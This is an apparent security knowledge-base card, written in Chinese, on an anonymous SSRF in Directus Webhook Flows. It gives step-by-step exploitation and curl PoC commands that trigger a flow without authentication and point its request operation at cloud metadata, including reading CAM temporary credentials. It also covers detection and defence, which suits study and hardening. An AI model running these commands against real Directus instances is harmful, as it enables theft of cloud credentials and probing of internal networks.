---
id: web-generic-ssrf-directus-anonymous-webhook-flow-request
title: Directus Webhook Flow 匿名触发 request 操作以系统身份发起 SSRF
type: scenario
domain: web
path: web/generic/ssrf
technique: unauth-webhook-flow-system-request-ssrf
aliases:
- Directus 匿名 Flow SSRF
- /flows/trigger 未授权
- Webhook Flow request 操作 SSRF
- Directus 系统身份请求
- Directus flow UUID 泄露
tags:
- directus
- ssrf
- webhook
- flow
- unauthorized
- system-accountability
- cloud-metadata
- no-auth
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V68
  verified_at: '2026-11-05T12:02:47+08:00'
  notes: 已对照原文核对：/flows/trigger/:pk 路由仅挂 checkIsLocked('flows')、无认证中间件；runWebhookFlow 按 id 从内存 handler 取用、不校验调用者；request 操作调用 getAxios() 复用同一 IMPORT_IP_DENY_LIST（默认仅 0.0.0.0/169.254.169.254）；实测匿名 curl 触发返回 .data=ins-2axv5mea， 的 role/user 为 null、roles 为空；原文还记录 operation 字段未关联导致  不含结果、return:、重启热加载等坑。卡内原理、配置步骤与边界一致。affected_versions 原为“Directus 12.2.0（原文实测）”，属于复现环境而非影响区间，已 set-versions --clear。未验证点：PoC 未在本机复跑；原文未给修复版本；frontmatter 无 sources/source_url。
---

## 一句话结论

Directus 的 Webhook Flow 触发器 `/flows/trigger/<uuid>` 没有认证中间件，只要知道 Flow 的 UUID，任何人都能匿名触发；若该 Flow 含有 request 操作，操作会以系统身份（accountability 全为 null、不经过权限校验）执行，从而形成零账号的服务端请求原语，可直打云 metadata 或内网服务。

## 原理

- Flow 是 Directus 的可视化自动化工作流，触发器包括 webhook、schedule、event。Webhook 触发器把 `GET/POST /flows/trigger/:pk` 注册为公开路由，源码中该路由只挂了 `checkIsLocked('flows')`（流程是否锁定），没有任何认证中间件。
- `runWebhookFlow(id, data, context)` 从内存表 `webhookFlowHandlers` 中按 id 取 handler，找到即执行，全程不检查调用者身份；唯一门槛是 Flow 的 UUID 是否已知。UUID 有 122 位随机熵，但 Flow id 会出现在活动日志、分享链接、前端状态等位置，泄露途径不少，把安全建立在“ID 猜不到”上本身脆弱。
- request 操作实现中调用 `getAxios()`，与文件导入共用同一 axios 实例和同一套 `IMPORT_IP_DENY_LIST` 黑名单；黑名单默认只含 `0.0.0.0` 与 `169.254.169.254`，因此指向腾讯云 `169.254.0.23` 等地址的请求不会被拦。
- 为什么是系统身份：触发响应的 `$accountability` 中 `role`、`user` 均为 null，`roles` 为空，`admin`、`app` 为 false。在 Directus 中 accountability 为 null 即系统身份，执行时不经过任何权限校验。管理员配置 Webhook Flow 时通常把触发 accountability 设为 `$all`（允许匿名触发），因为外部系统没有 Directus 账号；但“谁能触发”和“操作以什么身份执行”是两个独立配置，组合起来就是匿名可调、以系统权限发请求的 API。
- 为什么管理员会配出这种 Flow：Webhook Flow 的典型用途是给外部系统回调入口（订单推送、第三方通知），外部系统无账号，只能选 `$all`；request 操作本身也是正常业务（自动化调外部 API）。两个合理配置组合成一条匿名系统执行链，界面上没有警告。

## 触发条件

- Directus 实例存在一个 status 为 active、trigger 为 webhook 的 Flow，且该 Flow 的入口操作是 request（或链路上包含 request 操作）。
- 攻击者知道该 Flow 的 UUID（泄露于日志、分享链接、前端状态、错误信息等）。
- Flow 的触发 accountability 允许匿名（`$all` 或等价配置）；若设为 trigger/用户身份，匿名请求无法触发。
- 目标服务器可访问请求目标（云 metadata 地址、内网服务），且目标地址不在 `IMPORT_IP_DENY_LIST` 内。

## 利用步骤

1. 获取目标 Flow 的 UUID（从页面、日志、分享链接或历史泄露中收集）。
2. 直接向 `GET/POST /flows/trigger/<flow_id>` 发起请求，不带任何 token。
3. 确认响应中 `$last` 返回 request 操作的结果；若只返回触发数据，说明 Flow 的 webhook 选项未配置返回操作结果。
4. 将 request 操作的 url 指向 `http://169.254.0.23/latest/meta-data/instance-id` 等 metadata 端点（需管理员已配置该 Flow，或攻击者能创建/修改 Flow）。
5. 从 `$last.data` 读取 metadata 内容；若实例绑定 CAM 角色，继续读取 `cam/security-credentials/` 取得临时凭证。
6. 同一入口也可用于内网探测：request 操作指向内网 IP/端口，通过响应状态与耗时判断可达性。

## PoC

```bash
# 匿名触发 Webhook Flow，不带任何认证头
curl -s "http://target:8055/flows/trigger/<flow_id>"

# 返回示例（截断）：
# {"$trigger":{...},"$last":{"status":200,"statusText":"OK",...,"data":"ins-2axv5mea"},...}

# 触发响应中的系统身份
# "$accountability":{"role":null,"user":null,"roles":[],"admin":false,"app":false,"ip":"..."}
```

管理员侧创建该 Flow 的最小配置（用于复现条件）：

```bash
# 1) 建 Flow：webhook 触发，允许所有来源，返回操作结果
curl -s -X POST http://target:8055/flows \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"name":"meta-flow","status":"active","trigger":"webhook","accountability":"all","options":{"method":"GET","return":"$all"}}'

# 2) 建 request 操作
curl -s -X POST http://target:8055/operations \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"flow":"<flow_id>","type":"request","key":"op-meta","position_x":1,"position_y":1,"options":{"url":"http://169.254.0.23/latest/meta-data/instance-id","method":"GET"}}'

# 3) 把入口操作关联到 Flow（否则 $last 仍是触发数据）
curl -s -X PATCH http://target:8055/flows/<flow_id> \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"operation":"<op_id>"}'
```

## 变体与关联

- 变体：Flow 的 request 操作可指向任意内网地址，形成内网探测/打内部服务的原语，不限于云 metadata。
- 变体：Flow UUID 泄露面包括活动日志、分享链接、前端状态、备份文件、错误响应；拿到 UUID 即可匿名触发。
- 变体：若 Flow 的触发 accountability 不是 `$all`，匿名链不成立；但任何已登录低权限用户仍可能触发并借系统身份执行 request，形成权限提升。
- 关联：[[web-generic-ssrf-directus-default-denylist-domestic-cloud-metadata]]（同一 `getAxios()` 与默认名单缺口，import 链版本）；[[web-generic-ssrf-cloud-metadata]]（云 metadata SSRF 通用手法）。
- 关联：Directus 的 `0.0.0.0` 绕过（CVE-2026-61835，<12.0.0）是另一个 SSRF 防护缺陷，本条的匿名触发与名单缺口在 12.2.0 上仍成立。
- 边界：Flow 未激活、Flow 被锁定、request 操作未关联为入口操作、实例网络层阻断 metadata 时，本手法不成立。

## 检测与防御

- 检测：审计对 `/flows/trigger/<uuid>` 的匿名请求，尤其是来源 IP 异常、返回体含 `$last` 操作结果的请求；关注请求频率与目标为链路本地/内网地址的 Flow。
- 检测：检查所有 webhook Flow 的 accountability 配置与 request 操作的目标 URL，排查指向 metadata 地址或内网网段的 Flow。
- 防御：给 Webhook Flow 前置网关做签名校验或 IP 白名单；把 accountability 从 `$all` 改为需要认证的 trigger 身份；不要在 Flow id 可泄露的前提下把 UUID 当唯一防线。
- 防御：Flow 的 request 操作目标做白名单/域名校验，禁止指向链路本地与内网地址；补全 `IMPORT_IP_DENY_LIST` 覆盖国产云 metadata 与内网网段。
- 加固：限制 Flow/Operations 的创建与修改权限；定期审计活动日志中的 Flow 创建与触发记录；升级到最新版本并关注 Directus 对 Flow 触发认证的后续改动。
